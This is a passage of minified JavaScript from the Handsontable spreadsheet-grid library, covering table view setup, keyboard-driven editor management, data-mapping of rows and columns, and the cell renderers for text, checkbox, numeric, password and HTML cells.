t.settings.fixedColumnsLeft},fixedRowsTop:function(){return t.settings.fixedRowsTop},rowHeaders:function(){return e.hasRowHeaders()?[function(e,n){t.appendRowHeader(e,n)}]:[]},columnHeaders:function(){return e.hasColHeaders()?[function(e,n){t.appendColHeader(e,n)}]:[]},columnWidth:e.getColWidth,cellRenderer:function(e,n,r){var i=t.instance.colToProp(n),s=t.instance.getCellMeta(e,n),o=t.instance.getCellRenderer(s);var u=t.instance.getDataAtRowProp(e,i);o(t.instance,r,e,n,i,u,s);t.instance.PluginHooks.run("afterRenderer",r,e,n,i,u,s)},selections:{current:{className:"current",border:{width:2,color:"#5292F7",style:"solid",cornerVisible:function(){return t.settings.fillHandle&&!t.isCellEdited()&&!e.selection.isMultiple()}}},area:{className:"area",border:{width:1,color:"#89AFF9",style:"solid",cornerVisible:function(){return t.settings.fillHandle&&!t.isCellEdited()&&e.selection.isMultiple()}}},highlight:{highlightRowClassName:t.settings.currentRowClassName,highlightColumnClassName:t.settings.currentColClassName},fill:{className:"fill",border:{width:1,color:"red",style:"solid"}}},hideBorderOnMouseDownOver:function(){return t.settings.fragmentSelection},onCellMouseDown:function(t,n,r){e.listen();s=true;var i={row:n[0],col:n[1]};if(t.button===2&&e.selection.inInSelection(i)){}else if(t.shiftKey){e.selection.setRangeEnd(i)}else{e.selection.setRangeStart(i)}e.PluginHooks.run("afterOnCellMouseDown",t,n,r)},onCellMouseOver:function(t,n,r){var i={row:n[0],col:n[1]};if(s){e.selection.setRangeEnd(i)}else if(e.autofill.handle&&e.autofill.handle.isDragged){e.autofill.handle.isDragged++;e.autofill.showBorder(n)}e.PluginHooks.run("afterOnCellMouseOver",t,n,r)},onCellCornerMouseDown:function(t){e.autofill.handle.isDragged=1;t.preventDefault();e.PluginHooks.run("afterOnCellCornerMouseDown",t)},onCellCornerDblClick:function(){e.autofill.selectAdjacent()},beforeDraw:function(e){t.beforeRender(e)},onDraw:function(e){t.onDraw(e)},onScrollVertically:function(){e.runHooks("afterScrollVertically")},onScrollHorizontally:function(){e.runHooks("afterScrollHorizontally")}};e.PluginHooks.run("beforeInitWalkontable",u);this.wt=new Walkontable(u);n.on("resize."+e.guid,function(){e.registerTimeout("resizeTimeout",function(){e.parseSettingsFromDOM();var n=t.getWidth();var r=t.getHeight();if(u.width!==n||u.height!==r){e.forceFullRender=true;t.render();u.width=n;u.height=r}},60)});$(t.wt.wtTable.spreader).on("mousedown.handsontable, contextmenu.handsontable",function(e){if(e.target===t.wt.wtTable.spreader&&e.which===3){e.stopPropagation()}});r.on("click."+e.guid,function(){if(t.settings.observeDOMVisibility){if(t.wt.drawInterrupted){t.instance.forceFullRender=true;t.render()}}})};Handsontable.TableView.prototype.isTextSelectionAllowed=function(e){if(Handsontable.helper.isInput(e)){return true}if(this.settings.fragmentSelection&&this.wt.wtDom.isChildOf(e,this.TBODY)){return true}return false};Handsontable.TableView.prototype.isCellEdited=function(){var e=this.instance.getActiveEditor();return e&&e.isOpened()};Handsontable.TableView.prototype.getWidth=function(){var e=this.settings.width!==void 0?this.settings.width:this.settingsFromDOM.width;return typeof e==="function"?e():e};Handsontable.TableView.prototype.getHeight=function(){var e=this.settings.height!==void 0?this.settings.height:this.settingsFromDOM.height;return typeof e==="function"?e():e};Handsontable.TableView.prototype.beforeRender=function(e){if(e){this.instance.PluginHooks.run("beforeRender",this.instance.forceFullRender);this.wt.update("width",this.getWidth());this.wt.update("height",this.getHeight())}};Handsontable.TableView.prototype.onDraw=function(e){if(e){this.instance.PluginHooks.run("afterRender",this.instance.forceFullRender)}};Handsontable.TableView.prototype.render=function(){this.wt.draw(!this.instance.forceFullRender);this.instance.forceFullRender=false;this.instance.rootElement.triggerHandler("render.handsontable")};Handsontable.TableView.prototype.getCellAtCoords=function(e){var t=this.wt.wtTable.getCell([e.row,e.col]);if(t<0){return null}else{return t}};Handsontable.TableView.prototype.scrollViewport=function(e){this.wt.scrollViewport([e.row,e.col])};Handsontable.TableView.prototype.appendRowHeader=function(e,t){if(e>-1){this.wt.wtDom.fastInnerHTML(t,this.instance.getRowHeader(e))}else{var n=document.createElement("DIV");n.className="relative";this.wt.wtDom.fastInnerText(n," ");this.wt.wtDom.empty(t);t.appendChild(n)}};Handsontable.TableView.prototype.appendColHeader=function(e,t){var n=document.createElement("DIV"),r=document.createElement("SPAN");n.className="relative";r.className="colHeader";this.wt.wtDom.fastInnerHTML(r,this.instance.getColHeader(e));n.appendChild(r);this.wt.wtDom.empty(t);t.appendChild(n);this.instance.PluginHooks.run("afterGetColHeader",e,t)};Handsontable.TableView.prototype.maximumVisibleElementWidth=function(e){var t=this.wt.wtViewport.getWorkspaceWidth();if(this.settings.nativeScrollbars){return t}return t-e};Handsontable.TableView.prototype.maximumVisibleElementHeight=function(e){var t=this.wt.wtViewport.getWorkspaceHeight();if(this.settings.nativeScrollbars){return t}return t-e};(function(e){"use strict";function t(e){var t,n;n={};t=e;this.getInstance=function(e){if(!(e.guid in n)){n[e.guid]=new t(e)}return n[e.guid]}}var n={};var r=new WeakMap;e.editors={registerEditor:function(e,i){var s=new t(i);if(typeof e==="string"){n[e]=s}r.set(i,s)},getEditor:function(e,t){var i;if(typeof e=="function"){if(!r.get(e)){this.registerEditor(null,e)}i=r.get(e)}else if(typeof e=="string"){i=n[e]}else{throw Error('Only strings and functions can be passed as "editor" parameter ')}if(!i){throw Error('No editor registered under name "'+e+'"')}return i.getInstance(t)}}})(Handsontable);(function(e){"use strict";e.EditorManager=function(t,n,r){var i=this;var s=$(document);var o=e.helper.keyCode;var u;var a=function(){function a(s){if(!t.isListening()){return}if(n.settings.beforeOnKeyDown){n.settings.beforeOnKeyDown.call(t,s)}t.PluginHooks.run("beforeKeyDown",s);if(!s.isImmediatePropagationStopped()){n.lastKeyCode=s.keyCode;if(r.isSelected()){var a=(s.ctrlKey||s.metaKey)&&!s.altKey;if(!u.isWaiting()){if(!e.helper.isMetaKey(s.keyCode)&&!a&&!i.isEditorOpened()){i.openEditor("");s.stopPropagation();return}}var f=s.shiftKey?r.setRangeEnd:r.setRangeStart;switch(s.keyCode){case o.A:if(a){r.selectAll();s.preventDefault();s.stopPropagation();break};case o.ARROW_UP:if(i.isEditorOpened()&&!u.isWaiting()){i.closeEditorAndSaveChanges(a)}c(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_DOWN:if(i.isEditorOpened()&&!u.isWaiting()){i.closeEditorAndSaveChanges(a)}h(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_RIGHT:if(i.isEditorOpened()&&!u.isWaiting()){i.closeEditorAndSaveChanges(a)}p(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.ARROW_LEFT:if(i.isEditorOpened()&&!u.isWaiting()){i.closeEditorAndSaveChanges(a)}d(s.shiftKey);s.preventDefault();s.stopPropagation();break;case o.TAB:var v=typeof n.settings.tabMoves==="function"?n.settings.tabMoves(s):n.settings.tabMoves;if(s.shiftKey){r.transformStart(-v.row,-v.col)}else{r.transformStart(v.row,v.col,true)}s.preventDefault();s.stopPropagation();break;case o.BACKSPACE:case o.DELETE:r.empty(s);i.prepareEditor();s.preventDefault();break;case o.F2:i.openEditor();s.preventDefault();break;case o.ENTER:if(i.isEditorOpened()){if(u.state!==e.EditorState.WAITING){i.closeEditorAndSaveChanges(a)}l(s.shiftKey)}else{if(t.getSettings().enterBeginsEditing){i.openEditor()}else{l(s.shiftKey)}}s.preventDefault();s.stopImmediatePropagation();break;case o.ESCAPE:if(i.isEditorOpened()){i.closeEditorAndRestoreOriginalValue(a)}s.preventDefault();break;case o.HOME:if(s.ctrlKey||s.metaKey){f({row:0,col:n.selStart.col()})}else{f({row:n.selStart.row(),col:0})}s.preventDefault();s.stopPropagation();break;case o.END:if(s.ctrlKey||s.metaKey){f({row:t.countRows()-1,col:n.selStart.col()})}else{f({row:n.selStart.row(),col:t.countCols()-1})}s.preventDefault();s.stopPropagation();break;case o.PAGE_UP:r.transformStart(-t.countVisibleRows(),0);t.view.wt.scrollVertical(-t.countVisibleRows());t.view.render();s.preventDefault();s.stopPropagation();break;case o.PAGE_DOWN:r.transformStart(t.countVisibleRows(),0);t.view.wt.scrollVertical(t.countVisibleRows());t.view.render();s.preventDefault();s.stopPropagation();break;default:break}}}}function f(){i.openEditor()}function l(e){var t=typeof n.settings.enterMoves==="function"?n.settings.enterMoves(event):n.settings.enterMoves;if(e){r.transformStart(-t.row,-t.col)}else{r.transformStart(t.row,t.col,true)}}function c(e){if(e){r.transformEnd(-1,0)}else{r.transformStart(-1,0)}}function h(e){if(e){r.transformEnd(1,0)}else{r.transformStart(1,0)}}function p(e){if(e){r.transformEnd(0,1)}else{r.transformStart(0,1)}}function d(e){if(e){r.transformEnd(0,-1)}else{r.transformStart(0,-1)}}s.on("keydown.handsontable."+t.guid,a);t.view.wt.update("onCellDblClick",f);t.addHook("afterDestroy",function(){s.off("keydown.handsontable."+t.guid)})};this.destroyEditor=function(e){this.closeEditor(e)};this.getActiveEditor=function(){return u};this.prepareEditor=function(){if(u&&u.isWaiting()){this.closeEditor(false,false,function(e){if(e){i.prepareEditor()}});return}var r=n.selStart.row();var s=n.selStart.col();var o=t.colToProp(s);var a=t.getCell(r,s);var f=t.getDataAtCell(r,s);var l=t.getCellMeta(r,s);var c=t.getCellEditor(l);u=e.editors.getEditor(c,t);u.prepare(r,s,o,a,f,l)};this.isEditorOpened=function(){return u.isOpened()};this.openEditor=function(e){if(!u.cellProperties.readOnly){u.beginEditing(e)}};this.closeEditor=function(e,t,n){if(!u){if(n){n(false)}}else{u.finishEditing(e,t,n)}};this.closeEditorAndSaveChanges=function(e){return this.closeEditor(false,e)};this.closeEditorAndRestoreOriginalValue=function(e){return this.closeEditor(true,e)};a()}})(Handsontable);(function(e){"use strict";var t={};e.renderers={registerRenderer:function(e,n){t[e]=n},getRenderer:function(e){if(typeof e=="function"){return e}if(typeof e!="string"){throw Error('Only strings and functions can be passed as "renderer" parameter ')}if(!(e in t)){throw Error('No editor registered under name "'+e+'"')}return t[e]}}})(Handsontable);Handsontable.Dom=new WalkontableDom;Handsontable.helper.isPrintableChar=function(e){return e==32||e>=48&&e<=57||e>=96&&e<=111||e>=186&&e<=192||e>=219&&e<=222||e>=226||e>=65&&e<=90};Handsontable.helper.isMetaKey=function(e){var t=Handsontable.helper.keyCode;var n=[t.ARROW_DOWN,t.ARROW_UP,t.ARROW_LEFT,t.ARROW_RIGHT,t.HOME,t.END,t.DELETE,t.BACKSPACE,t.F1,t.F2,t.F3,t.F4,t.F5,t.F6,t.F7,t.F8,t.F9,t.F10,t.F11,t.F12,t.TAB,t.PAGE_DOWN,t.PAGE_UP,t.ENTER,t.ESCAPE,t.SHIFT,t.CAPS_LOCK,t.ALT];return n.indexOf(e)!=-1};Handsontable.helper.isCtrlKey=function(e){var t=Handsontable.helper.keyCode;return[t.CONTROL_LEFT,224,t.COMMAND_LEFT,t.COMMAND_RIGHT].indexOf(e)!=-1};Handsontable.helper.stringify=function(e){switch(typeof e){case"string":case"number":return e+"";break;case"object":if(e===null){return""}else{return e.toString()}break;case"undefined":return"";break;default:return e.toString()}};Handsontable.helper.spreadsheetColumnLabel=function(e){var t=e+1;var n="";var r;while(t>0){r=(t-1)%26;n=String.fromCharCode(65+r)+n;t=parseInt((t-r)/26,10)}return n};Handsontable.helper.isNumeric=function(e){var t=typeof e;return t=="number"?!isNaN(e)&&isFinite(e):t=="string"?!e.length?false:e.length==1?/\d/.test(e):/^\s*[+-]?\s*(?:(?:\d+(?:\.\d+)?(?:e[+-]?\d+)?)|(?:0x[a-f\d]+))\s*$/i.test(e):t=="object"?!!e&&typeof e.valueOf()=="number"&&!(e instanceof Date):false};Handsontable.helper.isArray=function(e){return Object.prototype.toString.call(e).match(/array/i)!==null};Handsontable.helper.isDescendant=function(e,t){var n=t.parentNode;while(n!=null){if(n==e){return true}n=n.parentNode}return false};Handsontable.helper.randomString=function(){return walkontableRandomString()};Handsontable.helper.inherit=function(e,t){t.prototype.constructor=t;e.prototype=new t;e.prototype.constructor=e;return e};Handsontable.helper.extend=function(e,t){for(var n in t){if(t.hasOwnProperty(n)){e[n]=t[n]}}};Handsontable.helper.getPrototypeOf=function(e){var t;if(typeof e.__proto__=="object"){t=e.__proto__}else{var n,r=e.constructor;if(typeof e.constructor=="function"){n=r;if(delete e.constructor){r=e.constructor;e.constructor=n}}t=r?r.prototype:null}return t};Handsontable.helper.columnFactory=function(e,t){function n(){}Handsontable.helper.inherit(n,e);for(var r=0,i=t.length;r<i;r++){n.prototype[t[r]]=void 0}return n};Handsontable.helper.translateRowsToColumns=function(e){var t,n,r,i,s=[],o=0;for(t=0,n=e.length;t<n;t++){for(r=0,i=e[t].length;r<i;r++){if(r==o){s.push([]);o++}s[r].push(e[t][r])}}return s};Handsontable.helper.to2dArray=function(e){var t=0,n=e.length;while(t<n){e[t]=[e[t]];t++}};Handsontable.helper.extendArray=function(e,t){var n=0,r=t.length;while(n<r){e.push(t[n]);n++}};Handsontable.helper.isInput=function(e){var t=["INPUT","SELECT","TEXTAREA"];return t.indexOf(e.nodeName)>-1};Handsontable.helper.isOutsideInput=function(e){return Handsontable.helper.isInput(e)&&e.className.indexOf("handsontableInput")==-1};Handsontable.helper.keyCode={MOUSE_LEFT:1,MOUSE_RIGHT:3,MOUSE_MIDDLE:2,BACKSPACE:8,COMMA:188,DELETE:46,END:35,ENTER:13,ESCAPE:27,CONTROL_LEFT:91,COMMAND_LEFT:17,COMMAND_RIGHT:93,ALT:18,HOME:36,PAGE_DOWN:34,PAGE_UP:33,PERIOD:190,SPACE:32,SHIFT:16,CAPS_LOCK:20,TAB:9,ARROW_RIGHT:39,ARROW_LEFT:37,ARROW_UP:38,ARROW_DOWN:40,F1:112,F2:113,F3:114,F4:115,F5:116,F6:117,F7:118,F8:119,F9:120,F10:121,F11:122,F12:123,A:65,X:88,C:67,V:86};Handsontable.helper.isObject=function(e){return Object.prototype.toString.call(e)=="[object Object]"};Handsontable.helper.isArray=function(e){return Array.isArray?Array.isArray(e):Object.prototype.toString.call(e)=="[object Array]"};Handsontable.helper.pivot=function(e){var t=[];if(!e||e.length==0||!e[0]||e[0].length==0){return t}var n=e.length;var r=e[0].length;for(var i=0;i<n;i++){for(var s=0;s<r;s++){if(!t[s]){t[s]=[]}t[s][i]=e[i][s]}}return t};Handsontable.helper.proxy=function(e,t){return function(){return e.apply(t,arguments)}};Handsontable.helper.cellMethodLookupFactory=function(e,t){function n(e){var t=Handsontable.cellTypes[e];if(typeof t=="undefined"){throw new Error('You declared cell type "'+e+'" as a string that is not mapped to a known object. Cell type must be an object or a string mapped to an object in Handsontable.cellTypes')}return t}t=typeof t=="undefined"?true:t;return function(i,s){return function o(r){if(!r){return}else if(r.hasOwnProperty(e)&&r[e]){return r[e]}else if(r.hasOwnProperty("type")&&r.type){var i;if(typeof r.type!="string"){throw new Error("Cell type must be a string ")}i=n(r.type);if(i.hasOwnProperty(e)){return i[e]}else if(t){return}}return o(Handsontable.helper.getPrototypeOf(r))}(typeof i=="number"?this.getCellMeta(i,s):i)}};Handsontable.helper.toString=function(e){return""+e};Handsontable.SelectionPoint=function(){this._row=null;this._col=null};Handsontable.SelectionPoint.prototype.exists=function(){return this._row!==null};Handsontable.SelectionPoint.prototype.row=function(e){if(e!==void 0){this._row=e}return this._row};Handsontable.SelectionPoint.prototype.col=function(e){if(e!==void 0){this._col=e}return this._col};Handsontable.SelectionPoint.prototype.coords=function(e){if(e!==void 0){this._row=e.row;this._col=e.col}return{row:this._row,col:this._col}};Handsontable.SelectionPoint.prototype.arr=function(e){if(e!==void 0){this._row=e[0];this._col=e[1]}return[this._row,this._col]};(function(e){"use strict";e.DataMap=function(e,t,n){this.instance=e;this.priv=t;this.GridSettings=n;this.dataSource=this.instance.getSettings().data;if(this.dataSource[0]){this.duckSchema=this.recursiveDuckSchema(this.dataSource[0])}else{this.duckSchema={}}this.createMap();this.getVars={};this.setVars={}};e.DataMap.prototype.DESTINATION_RENDERER=1;e.DataMap.prototype.DESTINATION_CLIPBOARD_GENERATOR=2;e.DataMap.prototype.recursiveDuckSchema=function(e){var t;if($.isPlainObject(e)){t={};for(var n in e){if(e.hasOwnProperty(n)){if($.isPlainObject(e[n])){t[n]=this.recursiveDuckSchema(e[n])}else{t[n]=null}}}}else{t=[]}return t};e.DataMap.prototype.recursiveDuckColumns=function(e,t,n){var r,i;if(typeof t==="undefined"){t=0;n=""}if($.isPlainObject(e)){for(i in e){if(e.hasOwnProperty(i)){if(e[i]===null){r=n+i;this.colToPropCache.push(r);this.propToColCache.set(r,t);t++}else{t=this.recursiveDuckColumns(e[i],t,i+".")}}}}return t};e.DataMap.prototype.createMap=function(){if(typeof this.getSchema()==="undefined"){throw new Error("trying to create `columns` definition but you didnt' provide `schema` nor `data`")}var e,t,n=this.getSchema();this.colToPropCache=[];this.propToColCache=new MultiMap;var r=this.instance.getSettings().columns;if(r){for(e=0,t=r.length;e<t;e++){if(typeof r[e].data!="undefined"){this.colToPropCache[e]=r[e].data;this.propToColCache.set(r[e].data,e)}}}else{this.recursiveDuckColumns(n)}};e.DataMap.prototype.colToProp=function(t){t=e.PluginHooks.execute(this.instance,"modifyCol",t);if(this.colToPropCache&&typeof this.colToPropCache[t]!=="undefined"){return this.colToPropCache[t]}else{return t}};e.DataMap.prototype.propToCol=function(t){var n;if(typeof this.propToColCache.get(t)!=="undefined"){n=this.propToColCache.get(t)}else{n=t}n=e.PluginHooks.execute(this.instance,"modifyCol",n);return n};e.DataMap.prototype.getSchema=function(){var e=this.instance.getSettings().dataSchema;if(e){if(typeof e==="function"){return e()}return e}return this.duckSchema};e.DataMap.prototype.createRow=function(e,t,n){var r,i=this.instance.countCols(),s=0,o;if(!t){t=1}if(typeof e!=="number"||e>=this.instance.countRows()){e=this.instance.countRows()}o=e;var u=this.instance.getSettings().maxRows;while(s<t&&this.instance.countRows()<u){if(this.instance.dataType==="array"){r=[];for(var a=0;a<i;a++){r.push(null)}}else if(this.instance.dataType==="function"){r=this.instance.getSettings().dataSchema(e)}else{r=$.extend(true,{},this.getSchema())}if(e===this.instance.countRows()){this.dataSource.push(r)}else{this.dataSource.splice(e,0,r)}s++;o++}this.instance.PluginHooks.run("afterCreateRow",e,s,n);this.instance.forceFullRender=true;return s};e.DataMap.prototype.createCol=function(t,n,r){if(this.instance.dataType==="object"||this.instance.getSettings().columns){throw new Error("Cannot create new column. When data source in an object, "+"you can only have as much columns as defined in first data row, data schema or in the 'columns' setting."+"If you want to be able to add new columns, you have to use array datasource.")}var i=this.instance.countRows(),s=this.dataSource,o,u=0,a;if(!n){n=1}a=t;var f=this.instance.getSettings().maxCols;while(u<n&&this.instance.countCols()<f){o=e.helper.columnFactory(this.GridSettings,this.priv.columnsSettingConflicts);if(typeof t!=="number"||t>=this.instance.countCols()){for(var l=0;l<i;l++){if(typeof s[l]==="undefined"){s[l]=[]}s[l].push(null)}this.priv.columnSettings.push(o)}else{for(var l=0;l<i;l++){s[l].splice(a,0,null)}this.priv.columnSettings.splice(a,0,o)}u++;a++}this.instance.PluginHooks.run("afterCreateCol",t,u,r);this.instance.forceFullRender=true;return u};e.DataMap.prototype.removeRow=function(e,t){if(!t){t=1}if(typeof e!=="number"){e=-t}e=(this.instance.countRows()+e)%this.instance.countRows();var n=this.physicalRowsToLogical(e,t);var r=this.instance.PluginHooks.execute("beforeRemoveRow",e,t);if(r===false){return}var i=this.dataSource;var s=i.filter(function(e,t){return n.indexOf(t)==-1});i.length=0;Array.prototype.push.apply(i,s);this.instance.PluginHooks.run("afterRemoveRow",e,t);this.instance.forceFullRender=true};e.DataMap.prototype.removeCol=function(e,t){if(this.instance.dataType==="object"||this.instance.getSettings().columns){throw new Error("cannot remove column with object data source or columns option specified")}if(!t){t=1}if(typeof e!=="number"){e=-t}e=(this.instance.countCols()+e)%this.instance.countCols();var n=this.instance.PluginHooks.execute("beforeRemoveCol",e,t);if(n===false){return}var r=this.dataSource;for(var i=0,s=this.instance.countRows();i<s;i++){r[i].splice(e,t)}this.priv.columnSettings.splice(e,t);this.instance.PluginHooks.run("afterRemoveCol",e,t);this.instance.forceFullRender=true};e.DataMap.prototype.spliceCol=function(t,n,r){var i=4<=arguments.length?[].slice.call(arguments,3):[];var s=this.instance.getDataAtCol(t);var o=s.slice(n,n+r);var u=s.slice(n+r);e.helper.extendArray(i,u);var a=0;while(a<r){i.push(null);a++}e.helper.to2dArray(i);this.instance.populateFromArray(n,t,i,null,null,"spliceCol");return o};e.DataMap.prototype.spliceRow=function(t,n,r){var i=4<=arguments.length?[].slice.call(arguments,3):[];var s=this.instance.getDataAtRow(t);var o=s.slice(n,n+r);var u=s.slice(n+r);e.helper.extendArray(i,u);var a=0;while(a<r){i.push(null);a++}this.instance.populateFromArray(t,n,[i],null,null,"spliceRow");return o};e.DataMap.prototype.get=function(e,t){this.getVars.row=e;this.getVars.prop=t;this.instance.PluginHooks.run("beforeGet",this.getVars);if(typeof this.getVars.prop==="string"&&this.getVars.prop.indexOf(".")>-1){var n=this.getVars.prop.split(".");var r=this.dataSource[this.getVars.row];if(!r){return null}for(var i=0,s=n.length;i<s;i++){r=r[n[i]];if(typeof r==="undefined"){return null}}return r}else if(typeof this.getVars.prop==="function"){return this.getVars.prop(this.dataSource.slice(this.getVars.row,this.getVars.row+1)[0])}else{return this.dataSource[this.getVars.row]?this.dataSource[this.getVars.row][this.getVars.prop]:null}};var t=e.helper.cellMethodLookupFactory("copyable",false);e.DataMap.prototype.getCopyable=function(e,n){if(t.call(this.instance,e,this.propToCol(n))){return this.get(e,n)}return""};e.DataMap.prototype.set=function(e,t,n,r){this.setVars.row=e;this.setVars.prop=t;this.setVars.value=n;this.instance.PluginHooks.run("beforeSet",this.setVars,r||"datamapGet");if(typeof this.setVars.prop==="string"&&this.setVars.prop.indexOf(".")>-1){var i=this.setVars.prop.split(".");var s=this.dataSource[this.setVars.row];for(var o=0,u=i.length-1;o<u;o++){s=s[i[o]]}s[i[o]]=this.setVars.value}else if(typeof this.setVars.prop==="function"){this.setVars.prop(this.dataSource.slice(this.setVars.row,this.setVars.row+1)[0],this.setVars.value)}else{this.dataSource[this.setVars.row][this.setVars.prop]=this.setVars.value}};e.DataMap.prototype.physicalRowsToLogical=function(e,t){var n=this.instance.countRows();var r=(n+e)%n;var i=[];var s=t;while(r<n&&s){this.get(r,0);i.push(this.getVars.row);s--;r++}return i};e.DataMap.prototype.clear=function(){for(var e=0;e<this.instance.countRows();e++){for(var t=0;t<this.instance.countCols();t++){this.set(e,this.colToProp(t),"")}}};e.DataMap.prototype.getAll=function(){return this.dataSource};e.DataMap.prototype.getRange=function(e,t,n){var r,i,s,o,u=[],a;var f=n===this.DESTINATION_CLIPBOARD_GENERATOR?this.getCopyable:this.get;i=Math.max(e.row,t.row);o=Math.max(e.col,t.col);for(r=Math.min(e.row,t.row);r<=i;r++){a=[];for(s=Math.min(e.col,t.col);s<=o;s++){a.push(f.call(this,r,this.colToProp(s)))}u.push(a)}return u};e.DataMap.prototype.getText=function(e,t){return SheetClip.stringify(this.getRange(e,t,this.DESTINATION_RENDERER))};e.DataMap.prototype.getCopyableText=function(e,t){return SheetClip.stringify(this.getRange(e,t,this.DESTINATION_CLIPBOARD_GENERATOR))}})(Handsontable);(function(e){"use strict";e.renderers.cellDecorator=function(e,t,n,r,i,s,o){if(o.readOnly){e.view.wt.wtDom.addClass(t,o.readOnlyCellClassName)}if(o.valid===false&&o.invalidCellClassName){e.view.wt.wtDom.addClass(t,o.invalidCellClassName)}if(!s&&o.placeholder){e.view.wt.wtDom.addClass(t,o.placeholderCellClassName)}}})(Handsontable);(function(e){"use strict";var t=function(t,n,r,i,s,o,u){e.renderers.cellDecorator.apply(this,arguments);if(!o&&u.placeholder){o=u.placeholder}var a=e.helper.stringify(o);if(u.rendererTemplate){t.view.wt.wtDom.empty(n);var f=document.createElement("TEMPLATE");f.setAttribute("bind","{{}}");f.innerHTML=u.rendererTemplate;HTMLTemplateElement.decorate(f);f.model=t.getDataAtRow(r);n.appendChild(f)}else{t.view.wt.wtDom.fastInnerText(n,a)}};e.renderers.TextRenderer=t;e.renderers.registerRenderer("text",t)})(Handsontable);(function(e){var t=document.createElement("DIV");t.className="htAutocompleteWrapper";var n=document.createElement("DIV");n.className="htAutocompleteArrow";n.appendChild(document.createTextNode("?"));var r=function(t,n){n.innerHTML=t.innerHTML;e.Dom.empty(t);t.appendChild(n)};var i=function(r,i,s,o,u,a,f){var l=t.cloneNode(true);var c=n.cloneNode(true);e.renderers.TextRenderer(r,i,s,o,u,a,f);i.appendChild(c);e.Dom.addClass(i,"htAutocomplete");if(!i.firstChild){i.appendChild(document.createTextNode(" "))}if(!r.acArrowListener){r.acArrowListener=function(){r.view.wt.getSetting("onCellDblClick")};r.rootElement.on("mousedown.htAutocompleteArrow",".htAutocompleteArrow",r.acArrowListener);r.addHookOnce("afterDestroy",function(){this.rootElement.off("mousedown.htAutocompleteArrow")})}};e.AutocompleteRenderer=i;e.renderers.AutocompleteRenderer=i;e.renderers.registerRenderer("autocomplete",i)})(Handsontable);(function(e){"use strict";var t=document.createElement("INPUT");t.className="htCheckboxRendererInput";t.type="checkbox";t.setAttribute("autocomplete","off");var n=function(n,r,i,s,o,u,a){if(typeof a.checkedTemplate==="undefined"){a.checkedTemplate=true}if(typeof a.uncheckedTemplate==="undefined"){a.uncheckedTemplate=false}n.view.wt.wtDom.empty(r);var f=t.cloneNode(false);if(u===a.checkedTemplate||u===e.helper.stringify(a.checkedTemplate)){f.checked=true;r.appendChild(f)}else if(u===a.uncheckedTemplate||u===e.helper.stringify(a.uncheckedTemplate)){r.appendChild(f)}else if(u===null){f.className+=" noValue";r.appendChild(f)}else{n.view.wt.wtDom.fastInnerText(r,"#bad value#")}var l=$(f);if(a.readOnly){l.on("click",function(e){e.preventDefault()})}else{l.on("mousedown",function(e){e.stopPropagation()});l.on("mouseup",function(e){e.stopPropagation()});l.on("change",function(){if(this.checked){n.setDataAtRowProp(i,o,a.checkedTemplate)}else{n.setDataAtRowProp(i,o,a.uncheckedTemplate)}})}if(!n.CheckboxRenderer||!n.CheckboxRenderer.beforeKeyDownHookBound){n.CheckboxRenderer={beforeKeyDownHookBound:true};n.addHook("beforeKeyDown",function(t){if(t.keyCode==e.helper.keyCode.SPACE){var r=n.getSelected();var i,s,o;var u={row:Math.min(r[0],r[2]),col:Math.min(r[1],r[3])};var a={row:Math.max(r[0],r[2]),col:Math.max(r[1],r[3])};for(var f=u.row;f<=a.row;f++){for(var l=a.col;l<=a.col;l++){i=n.getCell(f,l);o=n.getCellMeta(f,l);s=i.querySelectorAll("input[type=checkbox]");if(s.length>0&&!o.readOnly){if(!t.isImmediatePropagationStopped()){t.stopImmediatePropagation();t.preventDefault()}for(var c=0,h=s.length;c<h;c++){s[c].checked=!s[c].checked;$(s[c]).trigger("change")}}}}}})}};e.CheckboxRenderer=n;e.renderers.CheckboxRenderer=n;e.renderers.registerRenderer("checkbox",n)})(Handsontable);(function(e){"use strict";var t=function(t,n,r,i,s,o,u){if(e.helper.isNumeric(o)){if(typeof u.language!=="undefined"){numeral.language(u.language)}o=numeral(o).format(u.format||"0");t.view.wt.wtDom.addClass(n,"htNumeric")}e.renderers.TextRenderer(t,n,r,i,s,o,u)};e.NumericRenderer=t;e.renderers.NumericRenderer=t;e.renderers.registerRenderer("numeric",t)})(Handsontable);(function(e){"use strict";var t=function(e,t,n,r,i,s,o){Handsontable.renderers.TextRenderer.apply(this,arguments);s=t.innerHTML;var u;var a=o.hashLength||s.length;var f=o.hashSymbol||"*";for(u="";u.split(f).length-1<a;u+=f);e.view.wt.wtDom.fastInnerHTML(t,u)};e.PasswordRenderer=t;e.renderers.PasswordRenderer=t;e.renderers.registerRenderer("password",t)})(Handsontable);(function(e){function t(t,n,r,i,s,o,u){e.renderers.cellDecorator.apply(this,arguments);e.Dom.fastInnerHTML(n,o)}e.renderers.registerRenderer("html",t);e.renderers.HtmlRenderer=t})(Handsontable);(function(e){"use strict";function t(t){this.instance=t;this.state=e.EditorState.VIRGIN;this._opened=false;this._closeCallback=null;this.init()}e.EditorState={VIRGIN:"STATE_VIRGIN",EDITING:"STATE_EDITING",WAITING:"STATE_WAITING",FINISHED:"STATE_FINISHED"};t.prototype._fireCallbacks=function(e){if(this._closeCallback){this._closeCallback(e);this._closeCallback=null}};t.prototype.init=function(){};t.prototype.getValue=function(){throw Error("Editor getValue() method unimplemented")};t.prototype.setValue=function(e){throw Error("Editor setValue() method unimplemented")};t.prototype.open=function(){throw Error("Editor open() method unimplemented")};t.prototype.close=function(){throw Error("Editor close() method unimplemented")};t.prototype.prepare=function(t,n,r,i,s,o){this.TD=i;this.row=t;this.col=n;this.prop=r;this.originalValue=s;this.cellProperties=o;this.state=e.EditorState.VIRGIN};t.prototype.extend=function(){function t(){e.apply(this,arguments)}function n(e,t){function n(){}n.prototype=t.prototype;e.prototype=new n;e.prototype.constructor=e;return e}var e=this.constructor;return n(t,e)};t.prototype.saveValue=function(e,t){if(t){var n=this.instance.getSelected();this.instance.populateFromArray(n[0],n[1],e,n[2],n[3],"edit")}else{this.instance.populateFromArray(this.row,this.col,e,null,null,"edit")}};t.prototype.beginEditing=function(t){if(this.state!=e.EditorState.VIRGIN){return}this.instance.view.scrollViewport({row:this.row,col:this.col});this.instance.view.render();this.state=e.EditorState.EDITING;t=typeof t=="string"?t:this.originalValue;this.setValue(e.helper.stringify(t));this.open();this._opened=true;this.focus();this.instance.view.render()};t.prototype.finishEditing=function(t,n,r){if(r){var 